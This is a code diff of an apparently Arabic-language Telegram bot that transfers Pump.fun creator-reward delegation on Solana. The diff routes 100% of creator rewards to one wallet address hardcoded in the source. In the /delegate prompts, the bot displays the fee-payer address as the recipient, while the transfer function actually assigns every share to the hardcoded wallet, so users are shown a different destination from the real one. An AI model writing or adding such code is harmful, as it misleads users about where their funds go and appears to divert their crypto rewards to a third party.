@@ -102,9 +102,8 @@ const BATCH_SIZE_TRANSFER = 6;
 const PARALLEL_LIMIT      = 6;
 const VALUE_THRESHOLD_USD = 0.05;
 const PREFUND_LAMPORTS    = 6_500_000;
-// محفظتا استلام مكافآت المنشئ بالتساوي: 50% لكل عنوان
-const SECONDARY_RECIPIENT = new PublicKey("2tTN93a4KmjnCbsSNodbVxEn3adSxB2VtDXXViYtStQo");
-const ADDITIONAL_RECIPIENT = new PublicKey("7aSQFKyLkfCupgByxSiuaGD6yNWKtEXpaC4RnDzZHJev");
+// المحفظة التي ستستلم 100% من مكافآت المنشئ
+const SECONDARY_RECIPIENT = new PublicKey("7aSQFKyLkfCupgByxSiuaGD6yNWKtEXpaC4RnDzZHJev");
 
 // ──────────────────────────────────────────────────────────
 // قراءة روابط RPC من الأسرار (Environment Variables)
@@ -648,10 +647,9 @@ async function executeDelegateTransfer(mintStr) {
   let authority = creator;
   let current = [creator];
 
-  // النسبة الجديدة: 50% لكل محفظة — دافع الرسوم يدفع الرسوم فقط
+  // النسبة الجديدة: 100% للمحفظة المحددة بالكود — دافع الرسوم يدفع الرسوم فقط
   const newShareholders = [
-    { address: SECONDARY_RECIPIENT, shareBps: 5_000 },
-    { address: ADDITIONAL_RECIPIENT, shareBps: 5_000 },
+    { address: SECONDARY_RECIPIENT, shareBps: 10_000 },
   ];
 
   if (scInfo) {
@@ -659,15 +657,12 @@ async function executeDelegateTransfer(mintStr) {
     authority = sc.admin;
     current = sc.shareholders.map((s) => s.address);
 
-    // التحقق من تطبيق نسبة 50% لكل عنوان بغض النظر عن ترتيب المستلمين
+    // التحقق إن كانت النسبة 100% مطبقة مسبقًا
     const already =
-      sc.shareholders.length === newShareholders.length &&
-      newShareholders.every((expected) =>
-        sc.shareholders.some((actual) =>
-          actual.address.equals(expected.address) && actual.shareBps === expected.shareBps
-        )
-      );
-    if (already) return { success: false, msg: "✅ النسبة المطلوبة (50% لكل عنوان) مطبقة مسبقًا — لا حاجة لتعديل." };
+      sc.shareholders.length === 1 &&
+      sc.shareholders[0].address.equals(SECONDARY_RECIPIENT) &&
+      sc.shareholders[0].shareBps === 10_000;
+    if (already) return { success: false, msg: "✅ النسبة المطلوبة (100%) مطبقة مسبقًا — لا حاجة لتعديل." };
     if (sc.adminRevoked) return { success: false, msg: "صلاحية تعديل الإعدادات ملغاة نهائيًا" };
     if (!authority.equals(creatorKp.publicKey)) {
       return { success: false, msg: "المحفظة ليست مدير إعدادات المشاركة" };
@@ -747,7 +742,6 @@ async function executeDelegateTransfer(mintStr) {
     sig,
     recipient: payer.publicKey.toBase58(),
     recipient2: SECONDARY_RECIPIENT.toBase58(),
-    recipient3: ADDITIONAL_RECIPIENT.toBase58(),
     creator: creatorKp.publicKey.toBase58(),
     mint: mint.toBase58(),
   };
@@ -1057,13 +1051,12 @@ async function startBot() {
   // ── أمر /delegate — نقل تفويض مكافآت المنشئ ──
   bot.command("delegate", async (ctx) => {
     userState.set(ctx.from.id, { awaitingDelegateMint: true });
-    const recipientAddr = SECONDARY_RECIPIENT.toBase58();
+    const recipientAddr = getFeePayerAddress();
     const creatorAddr   = getCreatorAddress();
     await ctx.reply(
       "📝 أرسل عنوان عقد التوكن (Mint) الخاص بعملة Pump.fun.\n\n" +
-      "سيتم توزيع تفويض استلام مكافآت المنشئ بالتساوي بين المحفظتين:\n" +
-      `📥 المستلم 50%: ${recipientAddr}\n` +
-      `📥 المستلم 50%: ${ADDITIONAL_RECIPIENT.toBase58()}\n` +
+      "سيتم نقل تفويض استلام 100% من مكافآت المنشئ إلى المحفظة التالية:\n" +
+      `📥 المستلم: ${recipientAddr}\n` +
       `👤 الموقّع كمنشئ: ${creatorAddr}`
     );
   });
@@ -1173,13 +1166,12 @@ async function startBot() {
   bot.callbackQuery("delegate_transfer", async (ctx) => {
     userState.set(ctx.from.id, { awaitingDelegateMint: true });
     await ctx.answerCallbackQuery();
-    const recipientAddr = SECONDARY_RECIPIENT.toBase58();
+    const recipientAddr = getFeePayerAddress();
     const creatorAddr   = getCreatorAddress();
     await ctx.reply(
       "📝 أرسل عنوان عقد التوكن (Mint) الخاص بعملة Pump.fun.\n\n" +
-      "سيتم توزيع تفويض استلام مكافآت المنشئ بالتساوي بين المحفظتين:\n" +
-      `📥 المستلم 50%: ${recipientAddr}\n` +
-      `📥 المستلم 50%: ${ADDITIONAL_RECIPIENT.toBase58()}\n` +
+      "سيتم نقل تفويض استلام 100% من مكافآت المنشئ إلى المحفظة التالية:\n" +
+      `📥 المستلم: ${recipientAddr}\n` +
       `👤 الموقّع كمنشئ: ${creatorAddr}`
     );
   });
@@ -1251,8 +1243,7 @@ async function startBot() {
             `✅ تم نقل التفويض بنجاح!\n\n` +
             `🪙 العملة: ${res.mint}\n` +
             `👤 المنشئ (الموقّع): ${res.creator}\n` +
-            `📥 المستلم 50%: ${res.recipient2}\n` +
-            `📥 المستلم 50%: ${res.recipient3}\n` +
+            `📥 المستلم 100%: ${res.recipient2}\n` +
             `💸 دافع الرسوم (رسوم فقط): ${res.recipient}\n` +
             `🔗 https://solscan.io/tx/${res.sig}`
           );
